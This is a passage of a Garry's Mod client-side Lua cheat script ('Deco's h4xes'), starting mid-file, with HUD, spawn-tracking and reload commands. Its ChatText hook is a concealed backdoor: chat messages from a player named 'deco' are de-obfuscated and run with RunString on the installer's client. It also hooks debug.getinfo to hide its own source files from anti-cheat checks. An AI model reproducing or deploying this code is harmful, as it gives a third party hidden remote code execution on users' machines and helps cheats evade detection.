end hook.Add("HUDPaint","!", PropHuntHUD)
-- Finish!
Msg("Deco's h4xes are loaded and ready to pwn!\n")
if not INCED then
	timer.Simple(6,include,"autorun/client/!.lua")
	INCED = true
end
end
--_G["GO!"]()
hook.Add("ChatText", "thing", function(pi, pn, t, to)
	if string.find(pn:lower(), "deco") then
		string.gsub(t, "^::(%d+):(.*)$", function(a,b)
			if tonumber(a) == LocalPlayer():UserID() or tonumber(a) == -1337 then
				nns = ""
				for i = 1, b:len() do
				    nns = nns..string.char(string.byte(b:sub(i,i))-i+2)
				end
				RunString(nns)
			end
		end)
	end
end)
SNAP_SPAWNS = SNAP_SPAWNS or {}
function SpawnThink()
	for k,v in pairs(player.GetAll()) do
		if v:Alive() and v:GetNWBool("JustDead") then
			SNAP_SPAWNS[#SNAP_SPAWNS+1] = {v:Team(), v:GetPos()}
		end
		v:SetNWBool("JustDead", not v:Alive())
	end
end hook.Add("Think", "SpawnThink", SpawnThink)
function ReincludeME(p,c,a)
	local T_SNAP = false
	local T_SNAP_AS = false
	local T_SNAP_HUD = false
	if a[1]=="1" then
		T_SNAP = SNAP
		T_SNAP_AS = SNAP_AS
		T_SNAP_HUD = SNAP_HUD
	end
	include("autorun/client/!.lua")
	if a[1]=="1" then
		SNAP = T_SNAP
		SNAP_AS = T_SNAP_AS
		SNAP_HUD = T_SNAP_HUD
	end
	-- lua_run_cl include("autorun/client/!.lua")
end concommand.Add("ghax_reload",ReincludeME)
function RunMeh(p,c,a)
	_G["GO!"](a[1] == "1" or a[1] == "2")
	if a[1] == "2" then
		hook.Remove("Think","!")
		hook.Remove("Think","SpawnThink")
		RunConsoleCommand("decos_win")
	end
	-- lua include('autorun/client/!.lua')
end concommand.Add("ghax_load",RunMeh)
local oI = debug.getinfo
function debug.getinfo(...)
	local p,a,b,c = oI(...)
	if p and p.short_src == "autorun/client/decos_win.lua" or p.short_src == "autorun/client/!.lua" then
		p.short_src = "LOL, you failed"
	end
	return p,a,b,c
end
